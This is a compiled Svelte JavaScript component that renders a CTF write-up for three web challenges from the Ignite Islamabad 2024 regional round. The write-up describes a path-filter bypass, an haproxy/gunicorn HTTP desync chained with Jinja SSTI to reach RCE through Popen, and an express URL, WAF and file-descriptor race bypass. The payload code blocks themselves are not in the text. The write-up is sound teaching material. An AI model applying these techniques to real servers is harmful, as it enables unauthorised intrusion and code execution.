Cn=t(ks);ee=o(Cn,"$safeParts"),Cn.forEach(a),oe=o(W," array which means that if the element in array if "),xs=p(W,"CODE",{});var bn=t(xs);ne=o(bn,".."),bn.forEach(a),Fe=o(W," whatever the last character is will be removed. Combining this with the regex bypass earlier of "),Os=p(W,"CODE",{});var Tn=t(Os);pe=o(Tn,"newline"),Tn.forEach(a),te=o(W,". We can send an input such as:"),W.forEach(a),pa=i(s),Ps=E(s,!1),qs=i(s),L=p(s,"P",{});var $a=t(L);ce=o($a,"This bypassed the filter and we can read the "),Hs=p($a,"CODE",{});var gn=t(Hs);re=o(gn,"index.php"),gn.forEach(a),ie=o($a," file. The final script to read the flag:"),$a.forEach(a),ta=i(s),$s=E(s,!1),Ss=i(s),Q=p(s,"H2",{id:!0});var kn=t(Q);as=p(kn,"A",{href:!0});var xn=t(as);ye=o(xn,"SMG | Medium"),xn.forEach(a),kn.forEach(a),ca=i(s),es=p(s,"BLOCKQUOTE",{});var On=t(es);Rs=p(On,"P",{});var Pn=t(Rs);De=o(Pn,"This is related to HTTP Descync"),Pn.forEach(a),On.forEach(a),ra=i(s),G=p(s,"P",{});var Sa=t(G);de=o(Sa,"The challenge contained a "),Is=p(Sa,"CODE",{});var qn=t(Is);Ee=o(qn,"haproxy"),qn.forEach(a),ve=o(Sa," behind which a flask app is running. The web app is basically vulnerable to SSTI. The vulnerable function on the backend is:"),Sa.forEach(a),ia=i(s),Ls=E(s,!1),Gs=i(s),O=p(s,"P",{});var ys=t(O);fe=o(ys,"The input from user is being directly passed through "),js=p(ys,"CODE",{});var Hn=t(js);he=o(Hn,"render_template_string"),Hn.forEach(a),ue=o(ys," function. This looks quite straight forward. However, "),Us=p(ys,"CODE",{});var $n=t(Us);_e=o($n,"haproxy"),$n.forEach(a),me=o(ys," doesn’t let us access URL:"),ys.forEach(a),ya=i(s),Ws=E(s,!1),Bs=i(s),C=p(s,"P",{});var B=t(C);Ae=o(B,"Morever, with second ACL condition, its also difficult to provide "),Ks=p(B,"CODE",{});var Sn=t(Ks);we=o(Sn,"URL-encoded"),Sn.forEach(a),Ce=o(B," strings. Reading the code, we are using a very specific version of "),Ns=p(B,"CODE",{});var Rn=t(Ns);be=o(Rn,"gunicorn"),Rn.forEach(a),Te=o(B," in "),Ms=p(B,"CODE",{});var In=t(Ms);ge=o(In,"Dockerfile"),In.forEach(a),ke=o(B,":"),B.forEach(a),Da=i(s),zs=E(s,!1),Qs=i(s),b=p(s,"P",{});var K=t(b);xe=o(K,"The version "),Zs=p(K,"CODE",{});var Ln=t(Zs);Oe=o(Ln,"gunicorn<=20.0.4"),Ln.forEach(a),Pe=o(K," is very specific here to be exact. Looking online, i came across an HTTP Desync in this very specific version. Reading the blogs, i found a request specific for "),Js=p(K,"CODE",{});var Gn=t(Js);qe=o(Gn,"haproxy"),Gn.forEach(a),He=o(K," with "),Xs=p(K,"CODE",{});var jn=t(Xs);$e=o(jn,"gunicorn"),jn.forEach(a),Se=o(K,":"),K.forEach(a),da=i(s),Vs=E(s,!1),Ys=i(s),v=p(s,"P",{});var m=t(v);Re=o(m,"The request worked. However, everytime you change the payload the "),sl=p(m,"CODE",{});var Un=t(sl);Ie=o(Un,"Content-Length"),Un.forEach(a),Le=o(m,` here needs to be very correctly specified. If this is wrong, this would result in error. The first content length header
of `),ll=p(m,"CODE",{});var Wn=t(ll);Ge=o(Wn,"68"),Wn.forEach(a),je=o(m," starts from the letter "),al=p(m,"CODE",{});var Bn=t(al);Ue=o(Bn,"xxx.."),Bn.forEach(a),We=o(m," and ends where the next request starts. While the second header of length "),el=p(m,"CODE",{});var Kn=t(el);Be=o(Kn,"35"),Kn.forEach(a),Ke=o(m," starts at the beginning of body which is at "),ol=p(m,"CODE",{});var Nn=t(ol);Ne=o(Nn,"GET"),Nn.forEach(a),Me=o(m,` at the moment
and it ends at the `),nl=p(m,"CODE",{});var Mn=t(nl);ze=o(Mn,"\\r\\n\\r\\n"),Mn.forEach(a),Qe=o(m,"."),m.forEach(a),Ea=i(s),_=p(s,"P",{});var $=t(_);Ze=o($,"The left up part is SSTI. Reading the filters, we can’t use "),Fl=p($,"CODE",{});var zn=t(Fl);Je=o(zn,"{{"),zn.forEach(a),Xe=o($," and "),pl=p($,"CODE",{});var Qn=t(pl);Ve=o(Qn,"}}"),Qn.forEach(a),Ye=o($,". However, payloads like "),tl=p($,"CODE",{});var Zn=t(tl);so=o(Zn,"{%%}"),Zn.forEach(a),lo=o($," can still be used. The "),cl=p($,"CODE",{});var Jn=t(cl);ao=o(Jn,"{% with %}"),Jn.forEach(a),eo=o($," tag can be used to get RCE:"),$.forEach(a),va=i(s),rl=E(s,!1),il=i(s),T=p(s,"P",{});var N=t(T);oo=o(N,"Initially i called "),yl=p(N,"CODE",{});var Xn=t(yl);no=o(Xn,"import_string"),Xn.forEach(a),Fo=o(N," from "),Dl=p(N,"CODE",{});var Vn=t(Dl);po=o(Vn,"__globals__"),Vn.forEach(a),to=o(N," but that doesn’t work for some reason. So, lets go the old way of finding the "),dl=p(N,"CODE",{});var Yn=t(dl);co=o(Yn,"Popen"),Yn.forEach(a),ro=o(N," function first. Get the classes:"),N.forEach(a),fa=i(s),El=E(s,!1),vl=i(s),j=p(s,"P",{});var Ra=t(j);io=o(Ra,"This would result in a large output. Clean the output, store the list properly and the index of the "),fl=p(Ra,"CODE",{});var sF=t(fl);yo=o(sF,"Popen"),sF.forEach(a),Do=o(Ra," function. Once, you get the index, payload becomes simple:"),Ra.forEach(a),ha=i(s),hl=E(s,!1),ul=i(s),os=p(s,"P",{});var lF=t(os);Eo=o(lF,"With the final request would become:"),lF.forEach(a),ua=i(s),_l=E(s,!1),ml=i(s),Z=p(s,"H2",{id:!0});var aF=t(Z);ns=p(aF,"A",{href:!0});var eF=t(ns);vo=o(eF,"wtwaf | Hard"),eF.forEach(a),aF.forEach(a),_a=i(s),Fs=p(s,"BLOCKQUOTE",{});var oF=t(Fs);Al=p(oF,"P",{});var nF=t(Al);fo=o(nF,"Code Analysis & Race Condition. I wasn’t able to solve this challenge within due time. And kudos to its author and team Sekai for all the help in solving this later on."),nF.forEach(a),oF.forEach(a),ma=i(s),ps=p(s,"P",{});var FF=t(ps);ho=o(FF,"Reading the code, we had to exploit 3 things:"),FF.forEach(a),Aa=i(s),P=p(s,"UL",{});var Ds=t(P);J=p(Ds,"LI",{});var Ia=t(J);uo=o(Ia,"Bypass the "),wl=p(Ia,"CODE",{});var pF=t(wl);_o=o(pF,'req.originalUrl.toLowerCase().startsWith("/admin")'),pF.forEach(a),mo=o(Ia," statement."),Ia.forEach(a),Ao=i(Ds),ts=p(Ds,"LI",{});var yn=t(ts);wo=o(yn,"Bypass the WAF: "),Cl=p(yn,"CODE",{});var tF=t(Cl);Co=o(tF,'(item) => item && JSON.stringify(item).includes("flag")'),tF.forEach(a),yn.forEach(a),bo=i(Ds),X=p(Ds,"LI",{});var La=t(X);To=o(La,"Race conditon in "),bl=p(La,"CODE",{});var cF=t(bl);go=o(cF,"/admin/debug"),cF.forEach(a),ko=o(La," call."),La.forEach(a),Ds.forEach(a),wa=i(s),cs=p(s,"P",{});var rF=t(cs);xo=o(rF,"Initially, we need to bypass the middleware:"),rF.forEach(a),Ca=i(s),Tl=E(s,!1),gl=i(s),q=p(s,"P",{});var ds=t(q);Oo=o(ds,"This would require us to do a bit of code analysis of "),kl=p(ds,"CODE",{});var iF=t(kl);Po=o(iF,"express.js"),iF.forEach(a),qo=o(ds,". The "),xl=p(ds,"CODE",{});var yF=t(xl);Ho=o(yF,"req.originalUrl"),yF.forEach(a),$o=o(ds," is created as:"),ds.forEach(a),ba=i(s),Ol=E(s,!1),Pl=i(s),g=p(s,"P",{});var M=t(g);So=o(M,"The "),ql=p(M,"CODE",{});var DF=t(ql);Ro=o(DF,"req.url"),DF.forEach(a),Io=o(M," is the url after "),Hl=p(M,"CODE",{});var dF=t(Hl);Lo=o(dF,"GET"),dF.forEach(a),Go=o(M," in http request. And the requests are resolved through pathname. The first condition can be bypassed by providing a full url after "),$l=p(M,"CODE",{});var EF=t($l);jo=o(EF,"GET"),EF.forEach(a),Uo=o(M,":"),M.forEach(a),Ta=i(s),Sl=E(s,!1),Rl=i(s),rs=p(s,"P",{});var vF=t(rs);Wo=o(vF,"At the reading part we have:"),vF.forEach(a),ga=i(s),Il=E(s,!1),Ll=i(s),f=p(s,"P",{});var x=t(f);Bo=o(x,"The "),Gl=p(x,"CODE",{});var fF=t(Gl);Ko=o(fF,"file"),fF.forEach(a),No=o(x," parameter can be dictionary as extended parameters are not set to "),jl=p(x,"CODE",{});var hF=t(jl);Mo=o(hF,"false"),hF.forEach(a),zo=o(x,". The "),Ul=p(x,"CODE",{});var uF=t(Ul);Qo=o(uF,"readFileSync"),uF.forEach(a),Zo=o(x," and similar functions such as "),Wl=p(x,"CODE",{});var _F=t(Wl);Jo=o(_F,"readFile"),_F.forEach(a),Xo=o(x," can accept a dictionary with a specified set of attributes. The "),Bl=p(x,"CODE",{});var mF=t(Bl);Vo=o(mF,"object"),mF.forEach(a),Yo=o(x," to read a file is:"),x.forEach(a),ka=i(s),Kl=E(s,!1),Nl=i(s),U=p(s,"P",{});var Ga=t(U);sn=o(Ga,"Furthermore, the value of "),Ml=p(Ga,"CODE",{});var AF=t(Ml);ln=o(AF,"pathname"),AF.forEach(a),an=o(Ga," can be `urlencoded as well:"),Ga.forEach(a),xa=i(s),zl=E(s,!1),Ql=i(s),is=p(s,"P",{});var wF=t(is);en=o(wF,"When the above url is requested, the file be read. However, an error will trigger at following line:"),wF.forEach(a),Oa=i(s),Zl=E(s,!1),Jl=i(s),k=p(s,"P",{});var z=t(k);on=o(z,"Because now our parameter is an "),Xl=p(z,"CODE",{});var CF=t(Xl);nn=o(CF,"object"),CF.forEach(a),Fn=o(z," and it doesn’t have a function named "),Vl=p(z,"CODE",{});var bF=t(Vl);pn=o(bF,"includes"),bF.forEach(a),tn=o(z,". This is where the race conditions comes in. Since, the "),Yl=p(z,"CODE",{});var TF=t(Yl);cn=o(TF,"readFile"),TF.forEach(a),rn=o(z,` function is being successfully called, a file descriptor must have opened as well for this.
This is a very short window. If we can race the descriptor when the file is opened, we can read the flag. However, we can’t get just one descriptor as the time in which it opens is way too short. To cope this, we can generate infinity descriptors and try to race one.
This worked actually and the final poc would look like:`),z.forEach(a),Pa=i(s),sa=E(s,!1),la=xF(),this.h()},h(){Es(A,"href","#readme--easy"),Es(y,"id","readme--easy"),fs.a=hs,us.a=_s,Ts.a=gs,Ps.a=qs,$s.a=Ss,Es(as,"href","#smg--medium"),Es(Q,"id","smg--medium"),Ls.a=Gs,Ws.a=Bs,zs.a=Qs,Vs.a=Ys,rl.a=il,El.a=vl,hl.a=ul,_l.a=ml,Es(ns,"href","#wtwaf--hard"),Es(Z,"id","wtwaf--hard"),Tl.a=gl,Ol.a=Pl,Sl.a=Rl,Il.a=Ll,Kl.a=Nl,zl.a=Ql,Zl.a=Jl,sa.a=la},m(s,n){c(s,y,n),l(y,A),l(A,S),c(s,R,n),c(s,D,n),l(D,h),l(h,Y),l(h,vs),l(vs,ja),l(h,Ua),c(s,aa,n),c(s,ss,n),l(ss,Wa),c(s,ea,n),fs.m(PF,s,n),c(s,hs,n),c(s,ls,n),l(ls,Ba),c(s,oa,n),us.m(qF,s,n),c(s,_s,n),c(s,u,n),l(u,Ka),l(u,ms),l(ms,Na),l(u,Ma),l(u,As),l(As,za),l(u,Qa),l(u,ws),l(ws,Za),l(u,Ja),l(u,Cs),l(Cs,Xa),l(u,Va),c(s,na,n),c(s,I,n),l(I,Ya),l(I,bs),l(bs,se),l(I,le),c(s,Fa,n),Ts.m(HF,s,n),c(s,gs,n),c(s,w,n),l(w,ae),l(w,ks),l(ks,ee),l(w,oe),l(w,xs),l(xs,ne),l(w,Fe),l(w,Os),l(Os,pe),l(w,te),c(s,pa,n),Ps.m($F,s,n),c(s,qs,n),c(s,L,n),l(L,ce),l(L,Hs),l(Hs,re),l(L,ie),c(s,ta,n),$s.m(SF,s,n),c(s,Ss,n),c(s,Q,n),l(Q,as),l(as,ye),c(s,ca,n),c(s,es,n),l(es,Rs),l(Rs,De),c(s,ra,n),c(s,G,n),l(G,de),l(G,Is),l(Is,Ee),l(G,ve),c(s,ia,n),Ls.m(RF,s,n),c(s,Gs,n),c(s,O,n),l(O,fe),l(O,js),l(js,he),l(O,ue),l(O,Us),l(Us,_e),l(O,me),c(s,ya,n),Ws.m(IF,s,n),c(s,Bs,n),c(s,C,n),l(C,Ae),l(C,Ks),l(Ks,we),l(C,Ce),l(C,Ns),l(Ns,be),l(C,Te),l(C,Ms),l(Ms,ge),l(C,ke),c(s,Da,n),zs.m(LF,s,n),c(s,Qs,n),c(s,b,n),l(b,xe),l(b,Zs),l(Zs,Oe),l(b,Pe),l(b,Js),l(Js,qe),l(b,He),l(b,Xs),l(Xs,$e),l(b,Se),c(s,da,n),Vs.m(GF,s,n),c(s,Ys,n),c(s,v,n),l(v,Re),l(v,sl),l(sl,Ie),l(v,Le),l(v,ll),l(ll,Ge),l(v,je),l(v,al),l(al,Ue),l(v,We),l(v,el),l(el,Be),l(v,Ke),l(v,ol),l(ol,Ne),l(v,Me),l(v,nl),l(nl,ze),l(v,Qe),c(s,Ea,n),c(s,_,n),l(_,Ze),l(_,Fl),l(Fl,Je),l(_,Xe),l(_,pl),l(pl,Ve),l(_,Ye),l(_,tl),l(tl,so),l(_,lo),l(_,cl),l(cl,ao),l(_,eo),c(s,va,n),rl.m(jF,s,n),c(s,il,n),c(s,T,n),l(T,oo),l(T,yl),l(yl,no),l(T,Fo),l(T,Dl),l(Dl,po),l(T,to),l(T,dl),l(dl,co),l(T,ro),c(s,fa,n),El.m(UF,s,n),c(s,vl,n),c(s,j,n),l(j,io),l(j,fl),l(fl,yo),l(j,Do),c(s,ha,n),hl.m(WF,s,n),c(s,ul,n),c(s,os,n),l(os,Eo),c(s,ua,n),_l.m(BF,s,n),c(s,ml,n),c(s,Z,n),l(Z,ns),l(ns,vo),c(s,_a,n),c(s,Fs,n),l(Fs,Al),l(Al,fo),c(s,ma,n),c(s,ps,n),l(ps,ho),c(s,Aa,n),c(s,P,n),l(P,J),l(J,uo),l(J,wl),l(wl,_o),l(J,mo),l(P,Ao),l(P,ts),l(ts,wo),l(ts,Cl),l(Cl,Co),l(P,bo),l(P,X),l(X,To),l(X,bl),l(bl,go),l(X,ko),c(s,wa,n),c(s,cs,n),l(cs,xo),c(s,Ca,n),Tl.m(KF,s,n),c(s,gl,n),c(s,q,n),l(q,Oo),l(q,kl),l(kl,Po),l(q,qo),l(q,xl),l(xl,Ho),l(q,$o),c(s,ba,n),Ol.m(NF,s,n),c(s,Pl,n),c(s,g,n),l(g,So),l(g,ql),l(ql,Ro),l(g,Io),l(g,Hl),l(Hl,Lo),l(g,Go),l(g,$l),l($l,jo),l(g,Uo),c(s,Ta,n),Sl.m(MF,s,n),c(s,Rl,n),c(s,rs,n),l(rs,Wo),c(s,ga,n),Il.m(zF,s,n),c(s,Ll,n),c(s,f,n),l(f,Bo),l(f,Gl),l(Gl,Ko),l(f,No),l(f,jl),l(jl,Mo),l(f,zo),l(f,Ul),l(Ul,Qo),l(f,Zo),l(f,Wl),l(Wl,Jo),l(f,Xo),l(f,Bl),l(Bl,Vo),l(f,Yo),c(s,ka,n),Kl.m(QF,s,n),c(s,Nl,n),c(s,U,n),l(U,sn),l(U,Ml),l(Ml,ln),l(U,an),c(s,xa,n),zl.m(ZF,s,n),c(s,Ql,n),c(s,is,n),l(is,en),c(s,Oa,n),Zl.m(JF,s,n),c(s,Jl,n),c(s,k,n),l(k,on),l(k,Xl),l(Xl,nn),l(k,Fn),l(k,Vl),l(Vl,pn),l(k,tn),l(k,Yl),l(Yl,cn),l(k,rn),c(s,Pa,n),sa.m(XF,s,n),c(s,la,n)},p:tp,d(s){s&&a(y),s&&a(R),s&&a(D),s&&a(aa),s&&a(ss),s&&a(ea),s&&fs.d(),s&&a(hs),s&&a(ls),s&&a(oa),s&&us.d(),s&&a(_s),s&&a(u),s&&a(na),s&&a(I),s&&a(Fa),s&&Ts.d(),s&&a(gs),s&&a(w),s&&a(pa),s&&Ps.d(),s&&a(qs),s&&a(L),s&&a(ta),s&&$s.d(),s&&a(Ss),s&&a(Q),s&&a(ca),s&&a(es),s&&a(ra),s&&a(G),s&&a(ia),s&&Ls.d(),s&&a(Gs),s&&a(O),s&&a(ya),s&&Ws.d(),s&&a(Bs),s&&a(C),s&&a(Da),s&&zs.d(),s&&a(Qs),s&&a(b),s&&a(da),s&&Vs.d(),s&&a(Ys),s&&a(v),s&&a(Ea),s&&a(_),s&&a(va),s&&rl.d(),s&&a(il),s&&a(T),s&&a(fa),s&&El.d(),s&&a(vl),s&&a(j),s&&a(ha),s&&hl.d(),s&&a(ul),s&&a(os),s&&a(ua),s&&_l.d(),s&&a(ml),s&&a(Z),s&&a(_a),s&&a(Fs),s&&a(ma),s&&a(ps),s&&a(Aa),s&&a(P),s&&a(wa),s&&a(cs),s&&a(Ca),s&&Tl.d(),s&&a(gl),s&&a(q),s&&a(ba),s&&Ol.d(),s&&a(Pl),s&&a(g),s&&a(Ta),s&&Sl.d(),s&&a(Rl),s&&a(rs),s&&a(ga),s&&Il.d(),s&&a(Ll),s&&a(f),s&&a(ka),s&&Kl.d(),s&&a(Nl),s&&a(U),s&&a(xa),s&&zl.d(),s&&a(Ql),s&&a(is),s&&a(Oa),s&&Zl.d(),s&&a(Jl),s&&a(k),s&&a(Pa),s&&a(la),s&&sa.d()}}}function ip(V){let y,A;const S=[V[0],OF];let R={$$slots:{default:[rp]},$$scope:{ctx:V}};for(let D=0;D<S.length;D+=1)R=Dn(R,S[D]);return y=new cp({props:R}),{c(){lp(y.$$.fragment)},l(D){ap(y.$$.fragment,D)},m(D,h){ep(y,D,h),A=!0},p(D,[h]){const Y=h&1?op(S,[h&1&&gF(D[0]),h&0&&gF(OF)]):{};h&2&&(Y.$$scope={dirty:h,ctx:D}),y.$set(Y)},i(D){A||(np(y.$$.fragment,D),A=!0)},o(D){Fp(y.$$.fragment,D),A=!1},d(D){pp(y,D)}}}const OF={title:"CTF web challenge writeups for Ignite Islamabad 24 regional round",tags:["ignite-24","web","ctf","regional"],categories:["CTF","Writeups"],summary:"Writeups for all web related challenges from Ignite 2024 regional round of Islamabad",created:"2024-11-26T00:00:00.000Z",lastmod:"2024-11-26T00:00:00.000Z",image:"https://github.com/user-attachments/assets/505ce24b-a239-465b-b2cd-ea90a6f43bbd",flags:[],updated:"2024-12-26T17:53:42.694Z",slug:"/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups/+page.md",path:"/blog/2024/ctf-ignite-islamabad-regional-24-web-writeups",toc:[{depth:2,title:"readme | Easy",slug:"readme--easy"},{depth:2,title:"SMG | Medium",slug:"smg--medium"},{depth:2,title:"wtwaf | Hard",slug:"wtwaf--hard"}]};function yp(V,y,A){return V.$$set=S=>{A(0,y=Dn(Dn({},y),kF(S)))},y=kF(y),[y]}class Ep extends VF{constructor(y){super(),YF(this,y,yp,ip,sp,{})}}export{Ep as component};
